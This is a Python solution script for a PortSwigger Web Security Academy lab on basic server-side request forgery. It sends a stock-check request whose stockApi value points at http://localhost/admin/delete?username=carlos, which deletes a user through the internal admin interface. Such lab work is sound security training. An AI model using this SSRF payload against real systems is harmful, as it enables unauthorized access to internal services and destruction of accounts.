#!/usr/bin/env python

'''
This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

Lab Link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
'''

import requests


lab_id = '0acc00240323a6e481cd66c200cb0048' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock"

data = {'stockApi': 'http://localhost/admin/delete?username=carlos'}

r = requests.post(uri, data=data)
if "Congratulations" in r.text:
    print("solved")
else:
    print("nope")